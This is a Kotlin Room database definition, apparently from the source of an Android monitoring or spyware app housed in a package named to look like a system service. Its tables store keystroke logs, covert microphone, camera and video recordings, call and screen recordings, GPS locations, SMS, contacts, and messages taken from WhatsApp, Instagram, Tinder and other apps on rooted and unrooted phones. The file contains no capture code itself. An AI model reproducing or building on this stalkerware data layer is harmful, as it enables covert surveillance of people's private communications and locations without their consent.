package com.android.services.db.database

import androidx.room.Database
import androidx.room.RoomDatabase
import androidx.room.TypeConverters
import com.android.services.db.TextAlertEventDao
import com.android.services.db.dao.*
import com.android.services.db.entities.*
import com.android.services.util.Converters

@Database(
    entities = [SmsLog::class, CallLog::class, GpsLocation::class, Photos::class, Contacts::class, AppointmentLog::class, KeyLog::class, BrowserHistory::class, InstalledApp::class, ConnectedNetwork::class,
        PushStatus::class, MicBug::class, VideoBug::class, CameraBug::class, ScreenShot::class, ScreenTime::class, SnapChatEvent::class,
        CallRecording::class, ScreenRecording::class, VoipCall::class,
        WhatsAppRooted::class, LineRooted::class, ViberRooted::class, ImoRooted::class, InstagramMessageRooted::class,
        InstagramPostRooted::class, FacebookRooted::class, SkypeRooted::class, ZaloMessageRooted::class,
        ZaloPostRooted::class, HikeRooted::class, TumblrMessageRooted::class, TumblrPostRooted::class,
        HangoutRooted::class,
        TinderRooted::class, WhatsAppUnrooted::class,SkypeUnrooted::class,FacebookUnrooted::class, LineUnrooted::class, ViberUnrooted::class, IMOUnrooted::class,
        SnapChatUnrooted::class, InstagramUnrooted::class, TinderUnrooted::class, TumblrUnrooted::class, HikeUnrooted::class, WebSite::class,
        RestrictedCall::class, ScreenLimit::class, AppLimit::class, BlockedApp::class, GeoFence::class, GeoFenceEvent::class, VoiceMessage::class, TextAlert::class, AppNotifications::class,
        TextAlertEvent::class,PhoneServices::class],
    version = 5,
    exportSchema = false
)
@TypeConverters(Converters::class)
abstract class TOSDatabase : RoomDatabase() {

    abstract fun smsLogDao(): SmsLogDao
    abstract fun callLogDao(): CallLogDao
    abstract fun gpsLocationDao(): GpsLocationDao
    abstract fun photosDao(): PhotosDao
    abstract fun contactsDao(): ContactsDao
    abstract fun appointmentLogDao(): AppointmentLogDao
    abstract fun keyLogDao(): KeyLogDao
    abstract fun browserHistoryDao(): BrowserHistoryDao
    abstract fun installedAppDao(): InstalledAppsDao
    abstract fun connectedNetworkDao(): ConnectedNetworkDao
    abstract fun pushStatusDao(): PushStatusDao
    abstract fun micBugDao(): MicBugDao
    abstract fun videoBugDao(): VideoBugDao
    abstract fun cameraBugDao(): CameraBugDao
    abstract fun screenShotDao(): ScreenShotDao
    abstract fun screenTimeDao(): ScreenTimeDao
    abstract fun snapChatEventDao(): SnapChatEventDao
    abstract fun callRecordingDao(): CallRecordingDao
    abstract fun screenRecordingDao(): ScreenRecordingDao
    abstract fun voipCallDao(): VoipCallDao
    abstract fun webSiteDao(): WebSiteDao
    abstract fun blockedAppDao(): BlockedAppDao
    abstract fun restrictedCallDao(): RestrictedCallDao
    abstract fun screenLimitDao(): ScreenLimitDao
    abstract fun appLimitDao(): AppLimitDao
    abstract fun geoFenceDao(): GeoFenceDao
    abstract fun geoFenceEventDao(): GeoFenceEventDao
    abstract fun voiceMessageDao(): VoiceMessageDao
    abstract fun textAlertDao(): TextAlertDao
    abstract fun appNotificationsDao(): AppNotificationsDao
    abstract fun textAlertEventsDao(): TextAlertEventDao

    // Rooted IM Logs
    abstract fun whatsAppRootedDao(): WhatsAppRootedDao
    abstract fun lineRootedDao(): LineRootedDao
    abstract fun viberRootedDao(): ViberRootedDao
    abstract fun imoRootedDao(): ImoRootedDao
    abstract fun instagramMessageRootedDao(): InstagramMessageRootedDao
    abstract fun instagramPostRootedDao(): InstagramPostRootedDao
    abstract fun facebookRootedDao(): FacebookRootedDao
    abstract fun hangoutRootedDao(): HangoutRootedDao
    abstract fun skypeRootedDao(): SkypeRootedDao
    abstract fun zaloMessageRootedDao(): ZaloMessageRootedDao
    abstract fun zaloPostRootedDao(): ZaloPostRootedDao
    abstract fun hikeRootedDao(): HikeRootedDao
    abstract fun tinderRootedDao(): TinderRootedDao
    abstract fun tumblrMessageRootedDao(): TumblrMessageRootedDao
    abstract fun tumblrPostRootedDao(): TumblrPostRootedDao

    // Unrooted IM Logs
    abstract fun whatsAppUnrootedDao(): WhatsAppUnrootedDao
    abstract fun skypeUnrootedDao(): SkypeUnrootedDao
    abstract fun facebookUnrootedDao(): FacebookUnrootedDao
    abstract fun imoUnrootedDao(): IMOUnrootedDao
    abstract fun lineUnrootedDao(): LineUnrootedDao
    abstract fun viberUnrootedDao(): ViberUnrootedDao
    abstract fun snapChatUnrootedDao(): SnapChatUnrootedDao
    abstract fun instagramUnrootedDao(): InstagramUnrootedDao
    abstract fun hikeUnrootedDao(): HikeUnrootedDao
    abstract fun tumblrUnrootedDao(): TumblrUnrootedDao
    abstract fun tinderUnrootedDao(): TinderUnrootedDao

    //Phone Service
    abstract fun phoneServicesDao():PhoneServiceDao


}
